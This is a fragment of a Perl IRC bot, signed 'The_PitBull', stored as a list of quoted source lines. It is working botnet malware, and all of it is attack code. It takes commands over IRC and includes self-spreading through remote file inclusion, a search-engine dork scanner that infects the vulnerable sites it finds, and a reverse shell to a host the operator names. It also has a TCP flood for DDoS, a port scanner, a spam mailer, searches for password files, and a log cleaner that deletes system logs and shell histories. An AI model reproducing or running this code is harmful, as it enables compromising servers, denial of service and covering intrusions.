            "12 Start a Perl file : perl file.pl\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "LiNuX",
            "12] ",
            "12 - ",
            "12 Go back from dir : cd ..\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "LiNuX",
            "12] ",
            "12 - ",
            "12 Force to Remove a file/dir : rm -rf file/dir;ls -la\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "LiNuX",
            "12] ",
            "12 - ",
            "12 Show all files/dir with permissions : ls -lia\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "LiNuX",
            "12] ",
            "12 - ",
            "12 Find config.inc.php files : find / -type f -name config.inc.php\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "LiNuX",
            "12] ",
            "12 - ",
            "12 Find all writable folders and files : find / -perm -2 -ls\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "LiNuX",
            "12] ",
            "12 - ",
            "12 Find all .htpasswd files : find / -type f -name .htpasswd\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "LiNuX",
            "12] ",
            "12 - ",
            "12 Find all service.pwd files : find / -type f -name service.pwd\");",
            "######################",
            "#   End of  Help     # ",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^spread\\s+(.*)/) {",
            "$vuln = $1;",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Spread",
            "12] Spreading bot on :",
            "4 $vuln\");",
            "my $shellurl=\"http://\".$vuln.$spread.\"?\";",
            "my $reqz=HTTP::Request->new(GET=>$shellurl);",
            "my $ua=LWP::UserAgent->new();",
            "my $response=$ua->request($reqz);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Spread",
            "12] Bot is Spreaded on :",
            "4 $vuln\"); ",
            "######################",
            "#     Commands       # ",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^system/) {",
            "$uname=`uname -a`;$uptime=`uptime`;$ownd=`pwd`;$distro=`cat /etc/issue`;$id=`id`;$un=`uname -sro`;",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "SystemInfo",
            "12] ",
            "12Info BOT : ",
            "7 Servidor :Hiden : 6667\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "SystemInfo",
            "12] ",
            "12Uname -a     : ",
            "7 $uname\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "SystemInfo",
            "12] ",
            "12Uptime       : ",
            "7 $uptime\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "SystemInfo",
            "12] ",
            "12Own Prosses  : ",
            "7 $processo\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "SystemInfo",
            "12] ",
            "12ID           : ",
            "7 $id\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "SystemInfo",
            "12] ",
            "12Own Dir      : ",
            "7 $ownd\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "SystemInfo",
            "12] ",
            "12OS           : ",
            "7 $distro\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "SystemInfo",
            "12] ",
            "12Owner        : ",
            "7 The_PitBull\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "SystemInfo",
            "12] ",
            "12Channel      : ",
            "7 #pitbull\");",
            "if ($funcarg =~ /^milw0rm/) {",
            "    my @ltt=();",
            "    my @bug=();",
            "    my $x;",
            "    my $page=\"\";",
            "    my $socke = IO::Socket::INET->new(PeerAddr=>\"milw0rm.com\",PeerPort=>\"80\",Proto=>\"tcp\") or return;",
            "    print $socke \"GET http://milw0rm.com/rss.php HTTP/1.0\\r\\nHost: milw0rm.com\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";",
            "    my @r = <$socke>;",
            "    $page=\"@r\";",
            "    close($socke);",
            "    while ($page =~  m/<title>(.*)</g){",
            "    $x = $1;",
            "    if ($x =~ /\\&lt\\;/) {",
            "    $x =~ s/\\&lt\\;/</g;",
            "    }",
            "    if ($x !~ /milw0rm/) {",
            "    push (@bug,$x);",
            "    }}",
            "    while ($page =~  m/<link.*expl.*([0-9]...)</g) {",
            "    if ($1 !~ m/milw0rm.com|exploits|en/){",
            "    push (@ltt,\"http://www.milw0rm.com/exploits/$1 \");",
            "    }}",
            "        sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Milw0rm",
            "12 Latest exploits :",
            "    foreach $x (0..(@ltt - 1)) {",
            "        sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Milw0rm",
            "12  $bug[$x] - $ltt[$x]\");",
            "    sleep 1;",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%",
            "# % The_PitBull Pwned your BoX  %",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%",
            "######################",
            "#      Portscan      # ",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^portscan (.*)/) {",
            "  my $hostip=\"$1\";",
            "  my",
            "  @portas=(\"15\",\"19\",\"98\",\"20\",\"21\",\"22\",\"23\",\"25\",\"37\",\"39\",\"42\",\"43\",\"49\",\"53\",\"63\",\"69\",\"79\",\"80\",\"101\",\"106\",\"107\",\"109\",\"110\",\"111\",\"113\",\"115\",\"117\",\"119\",\"135\",\"137\",\"139\",\"143\",\"174\",\"194\",\"389\",\"389\",\"427\",\"443\",\"444\",\"445\",\"464\",\"488\",\"512\",\"513\",\"514\",\"520\",\"540\",\"546\",\"548\",\"565\",\"609\",\"631\",\"636\",\"694\",\"749\",\"750\",\"767\",\"774\",\"783\",\"808\",\"902\",\"988\",\"993\",\"994\",\"995\",\"1005\",\"1025\",\"1033\",\"1066\",\"1079\",\"1080\",\"1109\",\"1433\",\"1434\",\"1512\",\"2049\",\"2105\",\"2432\",\"2583\",\"3128\",\"3306\",\"4321\",\"5000\",\"5222\",\"5223\",\"5269\",\"5555\",\"6660\",\"6661\",\"6662\",\"6663\",\"6665\",\"6666\",\"6667\",\"6668\",\"6669\",\"7000\",\"7001\",\"7741\",\"8000\",\"8018\",\"8080\",\"8200\",\"10000\",\"19150\",\"27374\",\"31310\",\"33133\",\"33733\",\"55555\");",
            "  my (@aberta, %porta_banner);",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Portscan",
            "12 Scanning for open ports on ",
            "4\".$1.\"",
            "12 started ",
            ".\");",
            "  foreach my $porta (@portas)  {",
            "    my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>",
            "    'tcp', Timeout => 4);",
            "    if ($scansock) {",
            "      push (@aberta, $porta);",
            "      $scansock->close;",
            "    }",
            "  if (@aberta) {",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Portscan",
            "12 Open ports founded:",
            " @aberta\");",
            "    } else {",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Portscan",
            "12 No open ports foundend.",
            "######################",
            "#  End of  Portscan  # ",
            "#                    #",
            "######################",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%",
            "# % The_PitBull Pwned your BoX  %",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%",
            "######################",
            "#        Nmap        #  ",
            "#                    #",
            "######################",
            "   if ($funcarg =~ /^nmap\\s+(.*)\\s+(\\d+)\\s+(\\d+)/){",
            "         my $hostip=\"$1\";",
            "         my $portstart = \"$2\";",
            "         my $portend = \"$3\";",
            "         my (@abertas, %porta_banner); ",
            "       sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Nmap",
            "12] ",
            "4: $1 ",
            "12.:",
            "4Ports",
            "12:. ",
            "4 $2-$3\");",
            "       foreach my $porta ($portstart..$portend){",
            "               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime); ",
            "    if ($scansock) {",
            "                 push (@abertas, $porta);",
            "                 $scansock->close;",
            "                 if ($xstats){",
            "        sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Nmap",
            "12] ",
            "12Founded ",
            "4 $porta\".\"/Open\"); ",
            "                 }",
            "               }",
            "             }",
            "             if (@abertas) {",
            "        sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Nmap",
            "12] Complete \");",
            "             } else {",
            "        sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Nmap",
            "12] No open ports have been founded ",
            "13\");",
            "             }",
            "             }",
            "######################",
            "#    End of Nmap     #  ",
            "#                    #",
            "######################",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%",
            "# % The_PitBull Pwned your BoX  %",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%",
            "######################",
            "#    Log Cleaner     #  ",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^logcleaner/) {",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "LogCleaner",
            "12] This process can be long, just wait\"); ",
            "    system 'rm -rf /var/log/lastlog';",
            "    system 'rm -rf /var/log/wtmp';",
            "    system 'rm -rf /etc/wtmp';",
            "    system 'rm -rf /var/run/utmp';",
            "    system 'rm -rf /etc/utmp';",
            "    system 'rm -rf /var/log';",
            "    system 'rm -rf /var/logs';",
            "    system 'rm -rf /var/adm';",
            "    system 'rm -rf /var/apache/log';",
            "    system 'rm -rf /var/apache/logs';",
            "    system 'rm -rf /usr/local/apache/log'; ",
            "    system 'rm -rf /usr/local/apache/logs';",
            "    system 'rm -rf /root/.bash_history';",
            "    system 'rm -rf /root/.ksh_history';",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "LogCleaner",
            "12] All default log and bash_history files erased\"); ",
            "        sleep 1;",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "LogCleaner",
            "12] Now Erasing the rest of the machine log files\");",
            "    system 'find / -name *.bash_history -exec rm -rf {} \\;';",
            "    system 'find / -name *.bash_logout -exec rm -rf {} \\;';",
            "    system 'find / -name \"log*\" -exec rm -rf {} \\;';",
            "    system 'find / -name *.log -exec rm -rf {} \\;';",
            "        sleep 1;",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "LogCleaner",
            "12] Done! All logs erased\"); ",
            "      }",
            "######################",
            "# End of Log Cleaner #  ",
            "#                    #",
            "######################",
            "# The PitBull !!!!",
            "######################",
            "#       MAILER       #  ",
            "#                    #",
            "######################",
            "# For mailing use :",
            "# !bot @sendmail <subject> <sender> <recipient> <message>",
            "######################",
            "if ($funcarg =~ /^sendmail\\s+(.*)\\s+(.*)\\s+(.*)\\s+(.*)/) {",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Mailer",
            "12] Sending Mail to :",
            "2 $3\");",
            "$subject = $1;",
            "$sender = $2;",
            "$recipient = $3; ",
            "@corpo = $4;",
            "$mailtype = \"content-type: text/html\";",
            "$sendmail = '/usr/sbin/sendmail';",
            "open (SENDMAIL, \"| $sendmail -t\");",
            "print SENDMAIL \"$mailtype\\n\";",
            "print SENDMAIL \"Subject: $subject\\n\"; ",
            "print SENDMAIL \"From: $sender\\n\";",
            "print SENDMAIL \"To: $recipient\\n\\n\";",
            "print SENDMAIL \"@corpo\\n\\n\";",
            "close (SENDMAIL);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Mailer",
            "12] Mail Sended To :",
            "2 $recipient\"); ",
            "######################",
            "#   End of MAILER    #  ",
            "#                    #",
            "######################",
            "######################",
            "#  Join And Part     # ",
            "#                    #",
            "######################",
            "           if ($funcarg =~ /^join (.*)/) {",
            "              sendraw($IRC_cur_socket, \"JOIN \".$1);",
            "           }",
            "           if ($funcarg =~ /^part (.*)/) {",
            "              sendraw($IRC_cur_socket, \"PART \".$1);",
            "           }",
            "           ",
            "######################",
            "#End of Join And Part# ",
            "#                    #",
            "######################",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%",
            "# % The_PitBull Pwned your BoX  %",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%",
            "######################",
            "#     TCPFlood       # ",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^tcpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "TCP-DDOS",
            "12] Attacking",
            "4 \".$1.\":\".$2.\" ",
            "12for ",
            "4 \".$3.\" ",
            "12seconds.",
            "  my $itime = time;",
            "  my ($cur_time);",
            "  $cur_time = time - $itime;",
            "  while ($3>$cur_time){",
            "  $cur_time = time - $itime;",
            "  &tcpflooder(\"$1\",\"$2\",\"$3\");",
            "sendraw($IRC_cur_socket,\"PRIVMSG $printl :",
            "TCP-DDOS",
            "12] Attack done",
            "4 \".$1.\":\".$2.\".\");",
            "######################",
            "#  End of TCPFlood   # ",
            "#                    #",
            "######################",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%",
            "# % The_PitBull Pwned your BoX  %",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%",
            "######################",
            "#   Back Connect     # ",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^back\\s+(.*)\\s+(\\d+)/) {",
            "my $host = \"$1\";",
            "my $porta = \"$2\";",
            "my $proto = getprotobyname('tcp');",
            "my $iaddr = inet_aton($host);",
            "my $paddr = sockaddr_in($porta, $iaddr);",
            "my $shell = \"/bin/sh -i\";",
            "if ($^O eq \"MSWin32\") {",
            "  $shell = \"cmd.exe\";",
            "socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die \"socket: $!\";",
            "connect(SOCKET, $paddr) or die \"connect: $!\";",
            "open(STDIN, \">&SOCKET\");",
            "open(STDOUT, \">&SOCKET\");",
            "open(STDERR, \">&SOCKET\");",
            "system(\"$shell\");",
            "close(STDIN);",
            "close(STDOUT);",
            "close(STDERR);",
            "if ($estatisticas)",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "BackConnect",
            "12] Connecting to ",
            "4 $host:$porta\");",
            "######################",
            "#End of  Back Connect# ",
            "#                    #",
            "######################",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%",
            "# % The_PitBull Pwned your BoX  %",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%",
            "######################",
            "#    EXTREME SCANNER # ",
            "#                    #",
            "######################",
            "######################################################################",
            "#################### GOOGLE",
            "######################################################################",
            "if ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "my %hosts;",
            "### Start Message",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Scan",
            "12] The [E]xtreme RFiScan is started for ",
            "4$dork\");",
            "### End of Start Message",
            "# Starting The Search Engine",
            "    my @google=&googlet($dork);",
            "push(my @tot, @google);",
            "my @puliti=&unici(@tot);",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Scan",
            "12] ",
            "12 Total:",
            "4 \".scalar(@tot).\" ",
            "12Cleaned:",
            "4 \".scalar(@puliti).\" ",
            "12for ",
            "2 $dork \");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %100==0){ ",
            "if ($contatore==$uni-1){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Scan",
            "12] ",
            "12 finished for",
            "2 $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(5);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /DarkMindZ/ && $re =~ /uid=/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Vuln",
            "12] ",
            "12SafeMode:",
            "4OFF",
            "12Site:",
            "4 $print ",
            "2) \");",
            "my $test2=\"http://\".$sito.$bug.$spread.\"?\";",
            "my $reqz=HTTP::Request->new(GET=>$test2);",
            "my $ua=LWP::UserAgent->new();",
            "my $response=$ua->request($reqz);",
            "elsif($re =~ /DarkMindZ/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Vuln",
            "12] ",
            "12SafeMode:",
            "12Site:",
            "4 $print ",
            "2) \");",
            "my $test2=\"http://\".$sito.$bug.$spread.\"?\";",
            "my $reqz=HTTP::Request->new(GET=>$test2);",
            "my $ua=LWP::UserAgent->new();",
            "my $response=$ua->request($reqz);",
            "exit;",
            "######################################################################",
            "#################### AllTheWeb",
            "######################################################################",
            "if ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "my %hosts;",
            "# Starting The Search Engine",
            "    my @alltheweb=&allthewebt($dork);",
            "    my @allweb=&standard($dork);",
            "push(my @tot, @alltheweb, @allweb);",
            "my @puliti=&unici(@tot);",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Scan",
            "12] ",
            "12 Total:",
            "4 \".scalar(@tot).\" ",
            "12Cleaned:",
            "4 \".scalar(@puliti).\" ",
            "12for ",
            "2 $dork \");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %100==0){ ",
            "if ($contatore==$uni-1){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Scan",
            "12] ",
            "12 finished for",
            "2 $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(5);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /DarkMindZ/ && $re =~ /uid=/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Vuln",
            "12] ",
            "12SafeMode:",
            "4OFF",
            "12Site:",
            "4 $print ",
            "2) \");",
            "my $test2=\"http://\".$sito.$bug.$spread.\"?\";",
            "my $reqz=HTTP::Request->new(GET=>$test2);",
            "my $ua=LWP::UserAgent->new();",
            "my $response=$ua->request($reqz);",
            "elsif($re =~ /DarkMindZ/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Vuln",
            "12] ",
            "12SafeMode:",
            "12Site:",
            "4 $print ",
            "2) \");",
            "my $test2=\"http://\".$sito.$bug.$spread.\"?\";",
            "my $reqz=HTTP::Request->new(GET=>$test2);",
            "my $ua=LWP::UserAgent->new();",
            "my $response=$ua->request($reqz);",
            "exit;",
            "######################################################################",
            "#################### AOL",
            "######################################################################",
            "if ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "my %hosts;",
            "# Starting The Search Engine",
            "    my @aollist=&aol($dork);",
            "    my @aollista=&aola($dork);",
            "    my @aollistb=&aolb($dork);",
            "    my @aollistc=&aolc($dork);",
            "push(my @aolbyp,@aollist, @aollista, @aollistb, @aollistc );",
            "push(my @tot, @aolbyp);",
            "my @puliti=&unici(@tot);",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Scan",
            "12] ",
            "7AOL",
            "12 Total:",
            "4 \".scalar(@tot).\" ",
            "12Cleaned:",
            "4 \".scalar(@puliti).\" ",
            "12for ",
            "2 $dork \");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %100==0){ ",
            "if ($contatore==$uni-1){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Scan",
            "12] ",
            "7AOL",
            "12 finished for",
            "2 $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(5);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /DarkMindZ/ && $re =~ /uid=/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Vuln",
            "12] ",
            "12SafeMode:",
            "4OFF",
            "12Site:",
            "4 $print ",
            "2) \");",
            "my $test2=\"http://\".$sito.$bug.$spread.\"?\";",
            "my $reqz=HTTP::Request->new(GET=>$test2);",
            "my $ua=LWP::UserAgent->new();",
            "my $response=$ua->request($reqz);",
            "elsif($re =~ /DarkMindZ/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Vuln",
            "12] ",
            "12SafeMode:",
            "12Site:",
            "4 $print ",
            "2) \");",
            "my $test2=\"http://\".$sito.$bug.$spread.\"?\";",
            "my $reqz=HTTP::Request->new(GET=>$test2);",
            "my $ua=LWP::UserAgent->new();",
            "my $response=$ua->request($reqz);",
            "exit;",
            "######################################################################",
            "#################### Yahoo",
            "######################################################################",
            "if ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "my %hosts;",
            "# Starting The Search Engine",
            "    my @ylist=&yahoo($dork);",
            "    my @yalist=&yahooa($dork);",
            "    my @yblist=&yahoob($dork);",
            "    my @yclist=&yahooc($dork);",
            "    my @ydlist=&yahood($dork);",
            "        push(my @yahoobypass, @ylist, @yalist, @yblist, @yclist, @ydlist );    ",
            "push(my @tot, @yahoobypass);",
            "my @puliti=&unici(@tot);",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Scan",
            "12] ",
            "6ahoo",
            "12 Total:",
            "4 \".scalar(@tot).\" ",
            "12Cleaned:",
            "4 \".scalar(@puliti).\" ",
            "12for ",
            "2 $dork \");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %100==0){ ",
            "if ($contatore==$uni-1){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Scan",
            "12] ",
            "6ahoo",
            "12 finished for",
            "2 $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(5);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /DarkMindZ/ && $re =~ /uid=/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Vuln",
            "12] ",
            "12SafeMode:",
            "4OFF",
            "12Site:",
            "4 $print ",
            "2) \");",
            "my $test2=\"http://\".$sito.$bug.$spread.\"?\";",
            "my $reqz=HTTP::Request->new(GET=>$test2);",
            "my $ua=LWP::UserAgent->new();",
            "my $response=$ua->request($reqz);",
            "elsif($re =~ /DarkMindZ/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Vuln",
            "12] ",
            "12SafeMode:",
            "12Site:",
            "4 $print ",
            "2) \");",
            "my $test2=\"http://\".$sito.$bug.$spread.\"?\";",
            "my $reqz=HTTP::Request->new(GET=>$test2);",
            "my $ua=LWP::UserAgent->new();",
            "my $response=$ua->request($reqz);",
            "exit;",
            "######################################################################",
            "#################### MSN",
            "######################################################################",
            "if ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "my %hosts;",
            "# Starting The Search Engine",
            "    my @mlist=&msn($dork);",
            "push(my @tot, @mlist);",
            "my @puliti=&unici(@tot);",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Scan",
            "12] ",
            "12 Total:",
            "4 \".scalar(@tot).\" ",
            "12Cleaned:",
            "4 \".scalar(@puliti).\" ",
            "12for ",
            "2 $dork \");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %100==0){ ",
            "if ($contatore==$uni-1){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Scan",
            "12] ",
            "12 finished for",
            "2 $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(5);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /DarkMindZ/ && $re =~ /uid=/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Vuln",
            "12] ",
            "12SafeMode:",
            "4OFF",
            "12Site:",
            "4 $print ",
            "2) \");",
            "my $test2=\"http://\".$sito.$bug.$spread.\"?\";",
            "my $reqz=HTTP::Request->new(GET=>$test2);",
            "my $ua=LWP::UserAgent->new();",
            "my $response=$ua->request($reqz);",
            "elsif($re =~ /DarkMindZ/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Vuln",
            "12] ",
            "12SafeMode:",
            "12Site:",
            "4 $print ",
            "2) \");",
            "my $test2=\"http://\".$sito.$bug.$spread.\"?\";",
            "my $reqz=HTTP::Request->new(GET=>$test2);",
            "my $ua=LWP::UserAgent->new();",
            "my $response=$ua->request($reqz);",
            "exit;",
            "######################################################################",
            "#################### ASK",
            "######################################################################",
            "if ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "my %hosts;",
            "# Starting The Search Engine",
            "    my @asklist=&ask($dork);",
            "push(my @tot, @asklist);",
            "my @puliti=&unici(@tot);",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Scan",
            "12] ",
            "12 Total:",
            "4 \".scalar(@tot).\" ",
            "12Cleaned:",
            "4 \".scalar(@puliti).\" ",
            "12for ",
            "2 $dork \");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %100==0){ ",
            "if ($contatore==$uni-1){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Scan",
            "12] ",
            "12 finished for",
            "2 $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(5);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /DarkMindZ/ && $re =~ /uid=/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Vuln",
            "12] ",
            "12SafeMode:",
            "4OFF",
            "12Site:",
            "4 $print ",
            "2) \");",
            "my $test2=\"http://\".$sito.$bug.$spread.\"?\";",
            "my $reqz=HTTP::Request->new(GET=>$test2);",
            "my $ua=LWP::UserAgent->new();",
            "my $response=$ua->request($reqz);",
            "elsif($re =~ /DarkMindZ/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Vuln",
            "12] ",
            "12SafeMode:",
            "12Site:",
            "4 $print ",
